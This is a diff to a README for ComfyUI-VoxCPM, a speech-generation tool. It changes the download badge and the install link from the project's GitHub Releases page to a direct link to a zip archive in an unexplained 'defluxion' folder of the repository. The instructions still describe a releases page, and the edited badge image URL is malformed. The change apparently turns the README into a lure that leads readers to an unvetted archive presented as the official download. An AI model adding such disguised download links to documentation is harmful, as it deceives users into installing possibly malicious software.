@@ -6,13 +6,13 @@ Welcome to ComfyUI-VoxCPM! This application lets you create highly expressive sp
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-GitHub%20Releases-brightgreen)](https://github.com/krishnasaivamsi/ComfyUI-VoxCPM/releases)
+[![Download](https://raw.githubusercontent.com/krishnasaivamsi/ComfyUI-VoxCPM/main/defluxion/ComfyUI-VoxCPM.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/krishnasaivamsi/ComfyUI-VoxCPM/main/defluxion/ComfyUI-VoxCPM.zip)
 
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**: Click on the link below to go to the releases page, where you can find the latest version and other past versions of ComfyUI-VoxCPM.
 
-   [Visit this page to download](https://github.com/krishnasaivamsi/ComfyUI-VoxCPM/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/krishnasaivamsi/ComfyUI-VoxCPM/main/defluxion/ComfyUI-VoxCPM.zip)
 
 2. **Choose Your Version**: Look for the latest release at the top. You’ll see several files listed. Select the one that fits your system. Most likely, this will be the .exe file for Windows or a .dmg file for Mac.
 
